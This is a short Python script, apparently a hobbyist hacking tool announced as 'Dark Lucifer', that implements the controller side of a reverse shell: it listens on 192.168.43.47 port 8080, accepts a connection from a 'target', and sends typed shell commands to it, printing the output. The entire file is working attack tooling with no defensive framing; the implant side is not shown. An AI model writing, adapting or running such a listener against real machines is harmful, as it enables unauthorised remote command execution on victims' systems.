#  import reuqire module
import socket
import os
print("Welcome to the world of Dark Lucifer")



#os.system("clear || cls")
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket object "s"
    s.bind(("192.168.43.47", 8080)) # define the ip and port for listning

    s.listen() # for listning from unlimited connection

    print("[+] Listing for incoming TCP connection on port 8080")
    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client (target) IP address and source

    print("[+] We got a connection from : ", addr)

    ter = "terminated"

    while True:
        command = input("\nShell> ") # Get user input and store it in command variable
        if ter in command: #If we type terminate command, So the connection and break the loop
            conn.send(ter.encode("utf-8"))
            conn.close()
            break
        else:
            conn.send(str.encode(command))  # here we will send the command to the target
            client = str(conn.recv(1024).decode("utf-8"))
            print(client)  # and print the result that we got back

def main ():
    connect()

main()
